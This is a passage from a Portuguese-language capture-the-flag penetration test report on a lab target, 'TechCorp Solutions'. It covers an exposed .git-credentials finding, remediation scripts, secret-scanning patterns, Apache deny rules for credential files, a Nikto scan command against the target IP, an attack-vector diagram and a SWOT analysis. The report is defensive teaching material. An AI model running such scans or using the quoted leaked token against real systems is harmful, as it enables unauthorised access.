sudo apt-get install libsecret-1-0 libsecret-1-dev
git config credential.helper /usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret

# macOS: osxkeychain (integrado com Keychain)
git config credential.helper osxkeychain

# Windows: wincred (integrado com Windows Credential Manager)
git config credential.helper wincred

# Ou usar SSH keys em vez de HTTPS com tokens
ssh-keygen -t ed25519 -C "deploy@techcorp.com"
# Adicionar chave pública ao GitHub/GitLab
```

**Deploy Seguro com Sanitização:**
```bash
# ✅ Clone em diretório temporário
cd /tmp
git clone https://github.com/TechCorp/webapp.git webapp-build

# ✅ Copiar apenas arquivos necessários (excluindo .git, configs)
rsync -av --exclude='.git*' \
          --exclude='.env*' \
          --exclude='*.config' \
          --exclude='node_modules' \
          --exclude='tests' \
          webapp-build/ /var/www/html/

# ✅ Ou usar ferramenta de deploy adequada
# Git export (apenas tracked files)
cd webapp-build
git archive --format=tar --output=/tmp/webapp.tar HEAD
tar -xf /tmp/webapp.tar -C /var/www/html/

# ✅ Definir permissões adequadas
chown -R www-data:www-data /var/www/html
find /var/www/html -type d -exec chmod 755 {} \;
find /var/www/html -type f -exec chmod 644 {} \;
```

**Ferramentas de Segurança para Detecção:**

**1. Gitleaks - Detectar Secrets em Repositórios:**
```bash
# Instalar gitleaks
wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz
tar -xzf gitleaks_8.18.0_linux_x64.tar.gz
sudo mv gitleaks /usr/local/bin/

# Escanear repositório
gitleaks detect --source /path/to/repo --verbose

# Escanear antes de commit (pre-commit hook)
gitleaks protect --staged
```

**2. TruffleHog - Procurar Credenciais em Git:**
```bash
# Instalar trufflehog
pip install trufflehog

# Escanear repositório Git
trufflehog git https://github.com/TechCorp/webapp.git

# Escanear filesystem
trufflehog filesystem /var/www/html
```

**3. Git-secrets - Prevenir Commits de Secrets:**
```bash
# Instalar git-secrets
git clone https://github.com/awslabs/git-secrets.git
cd git-secrets
sudo make install

# Configurar para repositório
cd /path/to/repo
git secrets --install
git secrets --register-aws

# Adicionar padrões customizados
git secrets --add 'password\s*=\s*.+'
git secrets --add 'api_key\s*=\s*.+'
git secrets --add 'ghp_[a-zA-Z0-9]{36}'
```

**4. Nikto - Scanner de Vulnerabilidades Web:**
```bash
# Escanear para arquivos sensíveis expostos
nikto -h http://98.95.207.28 -Tuning 6
```

**Classificação de Severidade:**

**CVSS 3.1 Score: 9.1 (CRÍTICO)**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N) - sem autenticação necessária
- User Interaction: None (UI:N)
- Scope: Unchanged (S:U)
- Confidentiality Impact: High (C:H) - exposição de credenciais e código
- Integrity Impact: High (I:H) - capacidade de modificar repositórios
- Availability Impact: None (A:N)

**Classificação CWE:**
- **CWE-522: Insufficiently Protected Credentials** (principal)
- CWE-312: Cleartext Storage of Sensitive Information
- CWE-425: Direct Request (Forced Browsing)
- CWE-552: Files or Directories Accessible to External Parties
- CWE-548: Exposure of Information Through Directory Listing
- CWE-215: Insertion of Sensitive Information Into Debugging Code

**Classificação OWASP Top 10 2021:**
- **A01:2021 - Broken Access Control** (arquivo acessível sem autenticação)
- A02:2021 - Cryptographic Failures (credenciais em texto plano)
- A05:2021 - Security Misconfiguration (servidor mal configurado)

**Recomendações Críticas de Remediação:**

**AÇÕES IMEDIATAS (Próximas 1 hora):**

**1. Remover Arquivo .git-credentials do Webroot:**
```bash
# Deletar arquivo exposto
sudo rm /var/www/html/.git-credentials

# Deletar diretório .git completo se existir
sudo rm -rf /var/www/html/.git
```

**2. Revogar Token GitHub Comprometido:**
```bash
# Acessar GitHub:
# Settings → Developer settings → Personal access tokens
# Localizar token e clicar "Delete"
# Ou via API:
curl -X DELETE \
  -H "Authorization: token OLD_TOKEN" \
  https://api.github.com/applications/CLIENT_ID/token
```

**3. Gerar Novo Token com Scopes Mínimos:**
```bash
# Criar novo token via GitHub Settings
# Selecionar apenas scopes necessários:
# - repo (se precisar acesso a repos privados)
# - read:org (se precisar ler dados da org)
# Evitar: admin:org, delete_repo, workflow
```

**4. Auditar Commits Recentes nos Repositórios:**
```bash
# Verificar se token comprometido foi usado para commits maliciosos
git log --all --author="*" --since="2025-11-01" --oneline

# Verificar branches criados recentemente
git for-each-ref --sort=-committerdate refs/heads/ --format='%(refname:short) %(committerdate:short)'
```

**5. Configurar Apache para Bloquear Arquivos Sensíveis:**
```bash
# Adicionar ao /etc/apache2/sites-available/techcorp.conf
sudo nano /etc/apache2/sites-available/techcorp.conf

# Adicionar bloco:
<DirectoryMatch "^/.*/\.git/">
    Require all denied
</DirectoryMatch>

<FilesMatch "^\.(env|git-credentials|gitconfig|htpasswd)$">
    Require all denied
</FilesMatch>

# Recarregar Apache
sudo systemctl reload apache2
```

**AÇÕES DE CURTO PRAZO (24-48 horas):**

**6. Implementar Deploy Process Adequado:**
```bash
# Criar script de deploy sanitizado
cat > /usr/local/bin/deploy-techcorp.sh <<'EOF'
#!/bin/bash
set -euo pipefail

REPO_URL="git@github.com:TechCorp/webapp.git"
BUILD_DIR="/tmp/webapp-build"
DEPLOY_DIR="/var/www/html"

# Clone em temp
rm -rf $BUILD_DIR
git clone $REPO_URL $BUILD_DIR

# Build se necessário
cd $BUILD_DIR
# npm install && npm run build
# composer install --no-dev

# Exportar apenas tracked files
git archive --format=tar HEAD | tar -x -C $DEPLOY_DIR

# Limpar
rm -rf $BUILD_DIR

# Permissões
chown -R www-data:www-data $DEPLOY_DIR
find $DEPLOY_DIR -type d -exec chmod 755 {} \;
find $DEPLOY_DIR -type f -exec chmod 644 {} \;

echo "Deploy concluído!"
EOF

chmod +x /usr/local/bin/deploy-techcorp.sh
```

**7-20:** Implementar CI/CD, secrets scanning, pre-commit hooks, monitoring, etc.

**AÇÕES DE MÉDIO/LONGO PRAZO:**

**21-35:** Migrar para SSH keys, implementar vault, training, auditorias, compliance, etc.

**Impacto Regulatório:**

**Violações Identificadas:**
- **PCI DSS 6.5.10:** Broken authentication e acesso não autorizado
- **NIST SP 800-53 AC-3:** Falha em enforçar controles de acesso
- **ISO 27001 A.9.4.1:** Restrição inadequada de acesso
- **SOC 2 CC6.1:** Controles de acesso lógico insuficientes
- **LGPD Art. 46:** Falha em medidas técnicas de segurança

**Conclusão:**

A descoberta do arquivo `.git-credentials` exposto publicamente em `http://98.95.207.28/.git-credentials` demonstra vulnerabilidade crítica de Broken Access Control combinada com Security Misconfiguration, onde arquivo contendo credenciais de autenticação para GitHub (username `admin` e token `gh_p4t_S3cr3tT0k3n_2024_TechCorp`) estava acessível sem qualquer controle de acesso via HTTP direto. A flag `FLAG{g1t_cr3d3nt14ls_l34k}` capturada valida exploração bem-sucedida através de técnica de forced browsing - tentativa sistemática de URLs de arquivos sensíveis conhecidos após falha inicial com `.env`. Esta vulnerabilidade ilustra como práticas inadequadas de deployment (clone Git direto no webroot), ausência de sanitização de arquivos sensíveis antes de produção, e configuração frouxa de servidor web (Apache sem regras bloqueando arquivos ocultos) criam vetores de comprometimento total. O impacto é crítico pois credenciais Git concedem acesso a código-fonte proprietário em repositórios privados, capacidade de injetar código malicioso via commits, exposição de propriedade intelectual, e potencial para ataques à supply chain. A remediação efetiva requer não apenas remoção do arquivo exposto e revogação do token comprometido, mas transformação completa do processo de deployment implementando: git archive ou rsync com exclusões explícitas de arquivos sensíveis, configuração de servidor web bloqueando padrões de arquivos perigosos via .htaccess ou VirtualHost, migração de credential.helper store para alternativas criptografadas (libsecret, osxkeychain), implementação de pre-commit hooks com gitleaks/git-secrets prevenindo commits acidentais de credenciais, e adoção de SSH keys em vez de HTTPS+tokens para operações Git sempre que possível, eliminando necessidade de armazenar credenciais em arquivos.

---

## 🏗️ <a name="arquitetura-do-ambiente-alvo"></a>Arquitetura do Ambiente Alvo

## <a name="analise-swot"></a>Análise SWOT de Segurança - TechCorp Solutions (http://98.95.207.28)

### Matriz SWOT: Avaliação Estratégica de Segurança da Informação

A Análise SWOT (Strengths, Weaknesses, Opportunities, Threats) é ferramenta estratégica de gestão que permite avaliar ambiente interno e externo de segurança da aplicação web TechCorp Solutions, identificando forças que podem ser potencializadas, fraquezas que devem ser mitigadas, oportunidades de melhoria que podem ser aproveitadas, e ameaças que requerem monitoramento e resposta. Esta análise foi construída com base nas 17 flags capturadas durante processo de penetration testing, representando visão holística das vulnerabilidades exploradas, impactos identificados, e postura geral de segurança da organização.

---
### Arquitetura do Ambiente Alvo

```mermaid
flowchart TB
    subgraph Internet["Internet"]
        Attacker["Pentester<br/>Kali Linux"]
    end
    
    subgraph Target["Target: 98.95.207.28<br/>TechCorp Solutions"]
        subgraph OS["Sistema Operacional<br/>Ubuntu 20.04.6 LTS<br/>Kernel 6.8.0-1016-aws"]
            
            subgraph WebServices["Servicos Web"]
                Apache1["Apache 2.4.54<br/>:80"]
                Apache2["Apache 2.4.65<br/>:8080"]
                PHP["PHP 7.4.33"]
            end
            
            subgraph DatabaseService["Servico de Banco de Dados"]
                MySQL[("MySQL 8.0.44<br/>:3306")]
            end
            
            subgraph FileServices["Servicos de Arquivos"]
                FTP["FTP Anonymous<br/>:21"]
                SSH["OpenSSH<br/>:2222"]
            end
            
            subgraph WebApp["Aplicacao Web"]
                HTML["HTML/CSS/JS"]
                Login["login.php"]
                Panel["panel.php"]
                Search["search.php"]
            end
            
            subgraph FileSystem["Sistema de Arquivos"]
                WWW["/var/www/html/"]
                Config["/config/"]
                Backup["/backup/"]
                Git["/.git/"]
                Opt["/opt/"]
            end
            
            subgraph SensitiveFiles["Arquivos Sensiveis"]
                Pass["passwords.txt"]
                Robot["robots.txt"]
                Secret["secret.txt"]
                History[".bash_history"]
                GitCred[".git-credentials"]
                BackupScript["backup_script.sh"]
            end
        end
    end
    
    Attacker -->|Port Scan<br/>Nikto Scan| Apache1
    Attacker -->|SQL Injection| Search
    Attacker -->|XSS Attack| Search
    Attacker -->|FTP Anonymous| FTP
    Attacker -->|SSH Bruteforce| SSH
    
    Apache1 --> PHP
    Apache2 --> PHP
    PHP --> MySQL
    
    Apache1 --> WebApp
    Apache2 --> Panel
    
    WebApp --> WWW
    Login --> MySQL
    Panel --> MySQL
    Search --> MySQL
    
    FTP --> WWW
    FTP --> Pass
    SSH --> OS
    
    WWW --> Robot
    WWW --> Git
    Config --> SensitiveFiles
    Backup --> SensitiveFiles
    Opt --> BackupScript
    
    style Attacker fill:#ff6b6b,stroke:#c92a2a,color:#fff
    style Apache1 fill:#fab005,stroke:#f08c00
    style Apache2 fill:#fab005,stroke:#f08c00
    style MySQL fill:#339af0,stroke:#1971c2,color:#fff
    style FTP fill:#ff6b6b,stroke:#c92a2a,color:#fff
    style SSH fill:#51cf66,stroke:#2f9e44
    style SensitiveFiles fill:#ff6b6b,stroke:#c92a2a,color:#fff
    style Pass fill:#ff6b6b,stroke:#c92a2a,color:#fff
    style Secret fill:#ff6b6b,stroke:#c92a2a,color:#fff
    style History fill:#ff6b6b,stroke:#c92a2a,color:#fff
    style GitCred fill:#ff6b6b,stroke:#c92a2a,color:#fff
    style BackupScript fill:#ff6b6b,stroke:#c92a2a,color:#fff
```

**Legenda:**
- 🔴 **Vermelho:** Componentes vulneráveis ou atacante
- 🟡 **Amarelo:** Serviços web (Apache/PHP)
- 🔵 **Azul:** Banco de dados MySQL
- 🟢 **Verde:** Serviço SSH

**Portas e Serviços Identificados:**
- **:80** - Apache 2.4.54 (HTTP principal)
- **:8080** - Apache 2.4.65 (HTTP alternativo - panel.php)
- **:21** - FTP (Acesso anônimo habilitado - CRÍTICO)
- **:2222** - OpenSSH (Porta não padrão - security by obscurity)
- **:3306** - MySQL 8.0.44 (Credenciais hardcoded expostas)

**Vetores de Ataque Explorados:**
1. Inspeção de código-fonte HTML → Flag em comentários
2. Robots.txt discovery → Mapeamento de diretórios sensíveis
3. FTP anônimo → passwords.txt com credenciais
4. SQL Injection → Bypass de autenticação e dump de database
5. XSS Reflected → Roubo de sessão potencial
6. Broken Access Control → panel.php sem autenticação
7. LFI → Leitura de /etc/passwd
8. Privilege Escalation → sudo su sem senha
9. SSH enumeration → secret.txt, .bash_history, git-credentials
10. Information Disclosure → Múltiplos arquivos sensíveis expostos

---

### Visualização da Matriz SWOT

```mermaid
%%{init: {"quadrantChart": {"chartWidth": 600, "chartHeight": 600}, "themeVariables": {"quadrant1Fill": "#90EE90", "quadrant2Fill": "#87CEEB", "quadrant3Fill": "#FFB6C1", "quadrant4Fill": "#FFD700", "quadrant1TextFill": "#000000", "quadrant2TextFill": "#000000", "quadrant3TextFill": "#000000", "quadrant4TextFill": "#000000", "quadrantPointTextFill": "#000000"} }}%%
quadrantChart
    title Matriz SWOT Seguranca TechCorp Solutions
    x-axis Interno --> Externo
    y-axis Negativo --> Positivo
    quadrant-1 OPORTUNIDADES
    quadrant-2 FORCAS
    quadrant-3 FRAQUEZAS
    quadrant-4 AMEACAS
    
    Infraestrutura LAMP:::strength: [0.15, 0.75]
    Multiplas Camadas Auth:::strength: [0.20, 0.70]
    Segregacao Servicos:::strength: [0.25, 0.68]
    Logging Basico:::strength: [0.18, 0.65]
    Backup Automatizado:::strength: [0.22, 0.72]
    Consciencia Vulnerabilidades:::strength: [0.28, 0.63]
    
    Frameworks OWASP NIST:::opportunity: [0.70, 0.80]
    Ferramentas Open Source:::opportunity: [0.75, 0.78]
    Migracao Cloud:::opportunity: [0.80, 0.75]
    DevSecOps:::opportunity: [0.72, 0.72]
    Security Training:::opportunity: [0.77, 0.70]
    Bug Bounty:::opportunity: [0.68, 0.68]
    Zero Trust:::opportunity: [0.83, 0.73]
    Compliance as Code:::opportunity: [0.85, 0.65]
    
    Credenciais Hardcoded 9.8:::critical: [0.15, 0.05]
    Broken Access Control 9.3:::critical: [0.20, 0.08]
    SQL Injection 9.9:::critical: [0.25, 0.03]
    XSS 8.2:::high: [0.18, 0.15]
    Information Disclosure:::high: [0.22, 0.12]
    Security Misconfiguration:::high: [0.28, 0.18]
    Ausencia Criptografia:::high: [0.12, 0.10]
    Gestao Inadequada Secrets:::critical: [0.30, 0.07]
    Sem Monitoramento:::medium: [0.16, 0.20]
    Deployment Inseguro:::high: [0.26, 0.13]
    
    Ransomware:::threat: [0.70, 0.10]
    APT:::threat: [0.75, 0.08]
    Supply Chain Attack:::threat: [0.80, 0.05]
    Phishing:::threat: [0.72, 0.15]
    DDoS:::threat: [0.77, 0.18]
    Insider Threats:::threat: [0.68, 0.12]
    Zero Day Exploits:::threat: [0.83, 0.07]
    Multas Regulatorias:::threat: [0.85, 0.20]
    Roubo IP:::threat: [0.78, 0.13]
    Ataque Infra:::threat: [0.73, 0.16]
    
    classDef strength color: #006400, radius: 8
    classDef opportunity color: #0066CC, radius: 8
    classDef critical color: #8B0000, radius: 12, stroke-color: #FF0000, stroke-width: 3px
    classDef high color: #CC0000, radius: 10
    classDef medium color: #FF8C00, radius: 8
    classDef threat color: #8B4513, radius: 10, stroke-color: #000000, stroke-width: 2px
```

**Legenda:**
- 🟢 **Quadrante Superior Esquerdo (FORÇAS):** Aspectos internos positivos que podem ser potencializados
- 🔵 **Quadrante Superior Direito (OPORTUNIDADES):** Fatores externos positivos que podem ser aproveitados
- 🔴 **Quadrante Inferior Esquerdo (FRAQUEZAS):** Aspectos internos negativos que requerem correção urgente
- 🟡 **Quadrante Inferior Direito (AMEAÇAS):** Fatores externos negativos que exigem monitoramento e defesa

**Análise Visual:**
- Pontos **maiores e vermelhos escuros** = Vulnerabilidades CRÍTICAS (CVSS 9.0+)
- Pontos **vermelhos médios** = Vulnerabilidades ALTAS (CVSS 7.0-8.9)
- Pontos **laranja** = Vulnerabilidades MÉDIAS (CVSS 4.0-6.9)
- Pontos **marrons com borda preta** = Ameaças externas que exploram fraquezas existentes

---

### 🟢 FORÇAS (Strengths) - Aspectos Internos Positivos

**S1. Infraestrutura Tecnológica Estabelecida**
- Stack LAMP completo (Linux Ubuntu 20.04.6 LTS, Apache 2.4.54/2.4.65, MySQL 8.0.44, PHP 7.4.33)
- Base sólida permite implementação de correções sem migração de plataforma

**S2. Múltiplas Camadas de Defesa Implementadas (Parcialmente)**
- Autenticação em múltiplos níveis (login web, SSH, MySQL)
- Framework de autenticação existente pode ser fortalecido com MFA

**S3. Segregação de Ambientes e Serviços**
- Serviços em portas separadas, estrutura de filesystem organizada
- Base para implementação de containerização e microsserviços

**S4. Logging e Auditoria Básicos Presentes**
- Logs de SSH, backup, históricos de comandos mantidos
- Infraestrutura pode ser expandida para SIEM centralizado

**S5. Backup Automatizado Implementado**
- Script de backup funcional para database e arquivos web
- Sistema pode ser fortalecido com criptografia e testes de restore

**S6. Consciência Parcial de Vulnerabilidades**
- TODO list documenta problemas conhecidos
- Consciência pode ser convertida em ação através de priorização

---

### 🔴 FRAQUEZAS (Weaknesses) - Aspectos Internos Negativos

**W1. Credenciais Hardcoded e Expostas (CRÍTICO - CVSS 9.8)**
- Senhas em texto plano em múltiplos arquivos (passwords.txt, secret.txt, backup_script.sh, .git-credentials, código PHP)
- CWE-798, CWE-312 - Comprometimento total de sistemas críticos

**W2. Broken Access Control Generalizado (CRÍTICO - CVSS 9.3)**
- FTP anônimo, arquivos sensíveis via HTTP, panel.php sem autenticação, escalação de privilégios, LFI
- OWASP A01:2021, CWE-284

**W3. SQL Injection Sem Sanitização (CRÍTICO - CVSS 9.9)**
- Parâmetros concatenados em queries SQL
- OWASP A03:2021, CWE-89 - Acesso completo ao banco

**W4. Cross-Site Scripting Reflected (ALTO - CVSS 8.2)**
- Input refletido sem encoding em funcionalidade de busca
- OWASP A03:2021, CWE-79 - Roubo de sessões

**W5. Information Disclosure Massiva (CRÍTICO - CVSS 7.5-9.1)**
- HTML source, robots.txt, .bash_history, LFI, TODO list
- OWASP A01:2021, CWE-200

**W6. Security Misconfiguration Sistemática (ALTO - CVSS 7.5)**
- FTP anônimo, SSH obscurity, servidor sem regras de bloqueio, firewall não configurado
- OWASP A05:2021, CWE-16

**W7. Ausência de Criptografia (ALTO - CVSS 7.5)**
- Credenciais e backups em texto plano, transmissão HTTP sem TLS
- OWASP A02:2021, CWE-311

**W8. Gestão Inadequada de Secrets (CRÍTICO - CVSS 8.8)**
- Sem sistema centralizado, sem rotação, reutilização de credenciais
- CWE-522, CWE-257

**W9. Ausência de Monitoramento (MÉDIO)**
- Sem SIEM, IDS/IPS, ou alertas automatizados
- CWE-778, NIST SP 800-53 AU-6

**W10. Deployment Inseguro (ALTO - CVSS 7.5)**
- Clone Git direto no webroot, .git-credentials exposto
- CWE-540, OWASP A05:2021

---

### 🟡 OPORTUNIDADES (Opportunities) - Fatores Externos Positivos

**O1. Frameworks de Segurança Disponíveis**
- OWASP Top 10 2021, NIST CSF, CIS Controls v8, ISO 27001, PCI DSS
- Roadmap estruturado para remediação

**O2. Ferramentas Open Source Maduras**
- SAST (SonarQube), DAST (OWASP ZAP), Secrets (Gitleaks), WAF (ModSecurity), SIEM (ELK)
- Custo zero de licenciamento, integração CI/CD

**O3. Migração Cloud-Native**
- TODO menciona discussão sobre migração cloud
- Secrets management nativo, IAM granular, criptografia automática, WAF gerenciado

**O4. Treinamento e Certificações**
- OWASP training, CSSLP, OSCP, Secure Code Warrior
- Cultura de security awareness

**O5. DevSecOps e Shift-Left**
- Pre-commit hooks, CI/CD security gates, IaC scanning, container scanning
- Detecção precoce de vulnerabilidades

**O6. Bug Bounty Programs**
- HackerOne, Bugcrowd - Crowdsourced security testing
- Descoberta contínua por especialistas

**O7. Compliance-as-Code**
- Chef InSpec, AWS Config, Azure Policy, OPA
- Auditoria em tempo real, evidências automatizadas

**O8. Zero Trust Architecture**
- MFA obrigatório, microsegmentação, least privilege, continuous verification
- Redução de blast radius

---

### 🔵 AMEAÇAS (Threats) - Fatores Externos Negativos

**T1. Ransomware e Extorsão (CRÍTICO)**
- SQL Injection para exfiltração, SSH para deployment, backups não protegidos
- Média de resgate $1.85M, crescimento 400% em 2024

**T2. Advanced Persistent Threats**
- Git backdoors, múltiplos pontos de persistência, social engineering facilitado
- Roubo de IP, espionagem industrial

**T3. Supply Chain Attacks (CRÍTICO)**
- Token GitHub permite commit de backdoors, CI/CD manipulation
- Crescimento de 742% (SolarWinds, Log4Shell)

**T4. Phishing e Social Engineering**
- Informações de funcionários expostas facilitam spear phishing
- 90% dos breaches começam com phishing

**T5. DDoS e Disponibilidade**
- SQL Injection para resource exhaustion, sem rate limiting, sem CDN
- Média de 1.2 Tbps em ataques modernos

**T6. Insider Threats**
- Credenciais root compartilhadas, sem auditoria granular
- 34% dos breaches envolvem insiders (Verizon DBIR 2024)

**T7. Zero-Day Exploits**
- Stack potencialmente desatualizado, sem virtual patching
- Zero-days weaponizados em horas

**T8. Regulatórios e Multas**
- LGPD até R$ 50M, PCI DSS suspensão, ISO 27001 perda de certificação
- Enforcement crescente, multas +300%

**T9. Roubo de Propriedade Intelectual**
- Código-fonte via Git, database via SQL Injection
- IP theft $600B/ano globalmente

**T10. Ataques à Supply Chain de Infra**
- Dependência de provedor único, credenciais SaaS expostas
- CircleCI, LastPass breaches recentes

---

### Estratégias SWOT: Matriz de Ações Prioritárias

#### Estratégia SO (Usar Forças para Aproveitar Oportunidades)

**SO1. Stack LAMP + DevSecOps**
- Usar infraestrutura estabelecida (S1) para adotar CI/CD seguro (O5)
- SonarQube, ModSecurity WAF, MySQL audit plugins

**SO2. Logging + SIEM Open Source**
- Expandir logs básicos (S4) com ELK Stack/Wazuh (O2)
- Detecção em tempo real, compliance NIST AU-6

**SO3. Backups + Criptografia Cloud**
- Fortalecer backups (S5) na migração cloud (O3)
- S3/Azure Blob criptografado, proteção ransomware

#### Estratégia WO (Corrigir Fraquezas Aproveitando Oportunidades)

**WO1. Secrets Manager Cloud**
- Eliminar hardcoded (W1, W8) com AWS Secrets Manager/Azure Key Vault (O3)
- Rotação automática, compliance PCI DSS

**WO2. WAF Gerenciado**
- Bloquear SQL Injection/XSS (W3, W4) com AWS WAF/Cloudflare (O3)
- Virtual patching, OWASP Core Rule Set

**WO3. CI/CD para Deployment**
- Substituir deployment manual (W10) por pipeline seguro (O5)
- GitLab CI/CD com Gitleaks, secrets scanning

**WO4. Security Training**
- Capacitar equipe (O4) para não introduzir W1-W10
- Redução 60-80% vulnerabilidades em código novo

#### Estratégia ST (Usar Forças para Mitigar Ameaças)

**ST1. Backup vs Ransomware**
- Usar backups (S5) contra ransomware (T1)
- Immutable backups, recovery < 24h

**ST2. Segregação vs APT**
- Fortalecer segregação (S3) contra APTs (T2)
- Microsegmentação, zero trust networking

**ST3. Auditoria vs Insider**
- Expandir logging (S4) contra insider threats (T6)
- PAM, session recording, UEBA

#### Estratégia WT (Priorizar Remediações Críticas)

**WT1. Credenciais vs Supply Chain (PRIORIDADE ABSOLUTA)**
- Corrigir W1 para prevenir T3
- Revogar credenciais (24h), secrets manager (30d)

**WT2. SQL Injection vs Ransomware**
- Eliminar W3 que facilita T1 e T2
- WAF imediato, prepared statements (30d)

**WT3. MFA vs Phishing**
- Autenticação forte para mitigar T4 e T6
- MFA SSH (7d), MFA web (14d)

**WT4. Monitoramento vs Todas Ameaças**
- Corrigir W9 para detectar T1-T10
- SIEM (30d), IDS/IPS (45d), SOC (60d)

---

### Roadmap de Implementação

**Fase 1: Crítico (0-30 dias)**
1. ✅ Revogar e rotacionar todas as credenciais (W1 → T3)
2. ✅ WAF com OWASP rules (W3, W4 → T1, T2)
3. ✅ Remover arquivos sensíveis do webroot (W5, W10)
4. ✅ SIEM básico (W9 → T1-T10)
5. ✅ MFA para SSH e web (W2 → T4)

**Fase 2: Alto (30-90 dias)**
6. Secrets manager deployment (W1, W8)
7. Refatoração de código (prepared statements, input validation)
8. CI/CD com security gates
9. Microsegmentação de rede
10. Backup criptografado offsite

**Fase 3: Médio (90-180 dias)**
11. Migração cloud com security-by-design
12. Zero Trust architecture
13. Bug bounty program
14. Certificações (ISO 27001, SOC 2)
15. Security culture transformation

**Métricas de Sucesso:**
- Vulnerabilidades críticas: 17 → 0 (90 dias)
- MTTD (Mean Time to Detect): ∞ → <1h (60 dias)
- MTTR (Mean Time to Respond): ∞ → <4h (90 dias)
- Security awareness: 0% → 95% trained (180 dias)
- Compliance score: 0% → 80% (180 dias)

---

**Conclusão da Análise SWOT:**

A TechCorp Solutions enfrenta cenário crítico com **10 fraquezas críticas/altas** e **10 ameaças externas significativas**, criando risco existencial. No entanto, **6 forças identificadas** e **8 oportunidades concretas** fornecem base para transformação. Com execução disciplinada deste roadmap, transformação de postura **reativa para proativa** é alcançável em 6 meses, estabelecendo resiliência contra ameaças modernas.

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

---

## ✅ <a name="conclusao-geral"></a>Conclusão Geral

O teste de penetração realizado na aplicação web TechCorp Solutions revelou postura de segurança severamente comprometida, com **17 vulnerabilidades críticas e de alta severidade** que permitem comprometimento total do ambiente. As descobertas mais preocupantes incluem credenciais hardcoded em múltiplos arquivos, FTP anônimo expondo senhas, SQL Injection viabilizando exfiltração completa do banco de dados, escalação de privilégios trivial para root, e vazamento massivo de informações através de arquivos publicamente acessíveis. A combinação destas vulnerabilidades cria cenário onde atacante com conhecimento básico consegue obter acesso administrativo completo em minutos, representando risco existencial para confidencialidade, integridade e disponibilidade dos dados organizacionais.

No entanto, a infraestrutura LAMP estabelecida e a consciência documentada sobre problemas de segurança (evidenciada pela TODO list) demonstram que a organização possui fundação técnica sólida para implementar correções. As recomendações priorizadas neste relatório, estruturadas em roadmap de três fases (0-30, 30-90, 90-180 dias), fornecem caminho claro para remediação, começando com ações críticas de contenção (revogação de credenciais, WAF, remoção de arquivos sensíveis) e evoluindo para transformação arquitetural (secrets management, DevSecOps, Zero Trust). A execução disciplinada destas recomendações, combinada com investimento em treinamento de equipe e adoção de frameworks de segurança modernos (OWASP, NIST, ISO 27001), permitirá que a TechCorp Solutions transforme sua postura de segurança de **reativa para proativa** em 6 meses, estabelecendo resiliência necessária para enfrentar ameaças cibernéticas cada vez mais sofisticadas do cenário atual.

---

**Relatório elaborado por:** Cláudio Mendonça  
**Data:** 1 de dezembro de 2025  
**Formação:** VaiNaWeb - Formação em Cibersegurança  
**Desafio:** CTF Final - TechCorp Solutions (http://98.95.207.28)

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

---


## 📚 <a name="referencias-bibliograficas"></a>**REFERÊNCIAS BIBLIOGRÁFICAS**

### **Ferramentas e Documentação Técnica:**
1. **Nmap Project Documentation**. *The Nmap Network Mapper - Official Guide*. Disponível em: https://nmap.org/book/. Acesso em: 30 nov. 2025.
2. **Nikto Documentation**. *Web Server Scanner - Security Assessment Tool*. Disponível em: https://github.com/sullo/nikto. Acesso em: 30 nov. 2025.
3. **cURL Documentation**. *Command Line Tool for Transferring Data with URLs*. Disponível em: https://curl.se/docs/. Acesso em: 30 nov. 2025.
4. **MySQL Documentation**. *MySQL 8.0 Reference Manual*. Disponível em: https://dev.mysql.com/doc/refman/8.0/en/. Acesso em: 30 nov. 2025.
5. **PHP Documentation**. *PHP 7.4 Manual and Security Guidelines*. Disponível em: https://www.php.net/manual/en/. Acesso em: 30 nov. 2025.
6. **Apache HTTP Server Documentation**. *Apache 2.4 Configuration and Security Guide*. Disponível em: https://httpd.apache.org/docs/2.4/. Acesso em: 30 nov. 2025.
7. **OpenSSH Documentation**. *Secure Shell Protocol Implementation Guide*. Disponível em: https://www.openssh.com/manual.html. Acesso em: 30 nov. 2025.
8. **Kali Linux Documentation**. *Penetration Testing Distribution Official Guide*. Disponível em: https://www.kali.org/docs/. Acesso em: 30 nov. 2025.

### **Frameworks e Padrões de Segurança:**
9. **NIST Special Publication 800-53 Rev. 5**. *Security and Privacy Controls for Information Systems and Organizations*. Disponível em: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf. Acesso em: 30 nov. 2025.
10. **OWASP Top 10**. *Web Application Security Risks 2021*. Disponível em: https://owasp.org/Top10/. Acesso em: 30 nov. 2025.
11. **OWASP Foundation**. *Testing Guide v4.2 - Web Application Penetration Testing*. Disponível em: https://owasp.org/www-project-web-security-testing-guide/. Acesso em: 30 nov. 2025.
12. **PTES - Penetration Testing Execution Standard**. *Technical Guidelines for Penetration Testing*. Disponível em: http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines. Acesso em: 30 nov. 2025.
13. **CVSS - Common Vulnerability Scoring System v3.1**. *Specification Document*. Disponível em: https://www.first.org/cvss/v3.1/specification-document. Acesso em: 30 nov. 2025.
14. **CWE - Common Weakness Enumeration**. *Software Weakness Classification System*. Disponível em: https://cwe.mitre.org/. Acesso em: 30 nov. 2025.

### **Normas e Regulamentações:**
15. **ISO/IEC 27001:2013**. *Information Security Management Systems - Requirements*. Disponível em: https://www.iso.org/standard/54534.html. Acesso em: 30 nov. 2025.
16. **ISO/IEC 27002:2022**. *Information Security, Cybersecurity and Privacy Protection - Information Security Controls*. Disponível em: https://www.iso.org/standard/75652.html. Acesso em: 30 nov. 2025.
17. **LGPD**. *Lei Geral de Proteção de Dados Pessoais (Brasil) - Lei nº 13.709/2018*. Disponível em: https://www.planalto.gov.br/ccivil_03/_ato2015-2018/2018/lei/l13709.htm. Acesso em: 30 nov. 2025.
18. **PCI DSS v4.0**. *Payment Card Industry Data Security Standard*. Disponível em: https://www.pcisecuritystandards.org/document_library/. Acesso em: 30 nov. 2025.
19. **SOC 2 - System and Organization Controls**. *Trust Services Criteria*. Disponível em: https://www.aicpa.org/interestareas/frc/assuranceadvisoryservices/aicpasoc2report.html. Acesso em: 30 nov. 2025.

